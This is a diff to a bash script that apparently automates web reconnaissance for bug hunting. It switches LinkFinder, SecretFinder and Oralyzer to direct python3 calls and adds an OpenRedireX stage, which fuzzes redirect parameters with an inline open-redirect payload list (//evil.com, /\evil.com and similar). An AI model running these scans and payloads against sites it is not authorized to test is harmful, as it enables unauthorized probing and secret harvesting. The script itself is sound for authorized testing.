@@ -110,7 +110,7 @@ log "================================================================"
 
 while IFS= read -r TARGET; do
     log "[*] Linkfinder scanning: $TARGET"
-    linkfinder \
+    python3 /usr/local/bin/LinkFinder/linkfinder.py \
         -i "$TARGET" \
         -d \
         -o cli \
@@ -131,7 +131,7 @@ log "================================================================"
 
 while IFS= read -r TARGET; do
     log "[*] SecretFinder scanning: $TARGET"
-    secretfinder \
+    python3 /usr/local/bin/SecretFinder/SecretFinder.py \
         -i "$TARGET" \
         -e \
         -o cli \
@@ -178,12 +178,52 @@ log "ORALYZER - OPEN REDIRECT CHECK"
 log "================================================================"
 
 if [ -f /tmp/param_urls_$$.txt ]; then
-    oralyzer \
+    python3 /usr/local/bin/Oralyzer/oralyzer.py \
         -l /tmp/param_urls_$$.txt \
         2>/dev/null | tee -a /tmp/oralyzer_$$.txt >> "$REPORT"
 
     grep -iE "vulnerable|redirect|open redirect" \
         /tmp/oralyzer_$$.txt 2>/dev/null >> "$VULN_URLS"
+fi
+
+sleep 5
+
+log ""
+log "================================================================"
+log "OPENREDIREX - OPEN REDIRECT FUZZING"
+log "================================================================"
+
+if [ -f /tmp/param_urls_$$.txt ]; then
+    grep -iE "url=|redirect=|return=|next=|dest=|target=|rurl=|redir=|continue=" \
+        /tmp/param_urls_$$.txt 2>/dev/null | \
+        sed -E 's/(url=|redirect=|return=|next=|dest=|target=|rurl=|redir=|continue=)[^&]*/\1FUZZ/gi' \
+        > /tmp/openredirex_urls_$$.txt
+
+    OPENREDIREX_PAYLOADS="/tmp/openredirex_payloads_$$.txt"
+    cat > "$OPENREDIREX_PAYLOADS" << 'PAYLOADS'
+//evil.com
+https://evil.com
+//google.com%252F@evil.com
+https:evil.com
+/\evil.com
+////evil.com
+PAYLOADS
+
+    if [ -s /tmp/openredirex_urls_$$.txt ]; then
+        while IFS= read -r target_url; do
+            echo "$target_url" | openredirex \
+                -p "$OPENREDIREX_PAYLOADS" \
+                -k FUZZ \
+                -c 20 \
+                2>/dev/null | tee -a /tmp/openredirex_$$.txt >> "$REPORT"
+            sleep 2
+        done < /tmp/openredirex_urls_$$.txt
+
+        grep -iE "vulnerable|redirect" \
+            /tmp/openredirex_$$.txt 2>/dev/null >> "$VULN_URLS"
+    fi
+
+    rm -f "$OPENREDIREX_PAYLOADS"
 fi
 
 sort -u "$VULN_URLS" -o "$VULN_URLS"
@@ -199,4 +239,5 @@ log "[+] Full report saved to: $REPORT"
 
 rm -f "$TARGETS" /tmp/assetfinder_$$.txt /tmp/kite_$$.txt \
     /tmp/arjun_all_$$.txt /tmp/linkfinder_$$.txt /tmp/secretfinder_$$.txt \
-    /tmp/param_urls_$$.txt /tmp/qsreplace_$$.txt /tmp/oralyzer_$$.txt
+    /tmp/param_urls_$$.txt /tmp/qsreplace_$$.txt /tmp/oralyzer_$$.txt \
+    /tmp/openredirex_urls_$$.txt /tmp/openredirex_$$.txt
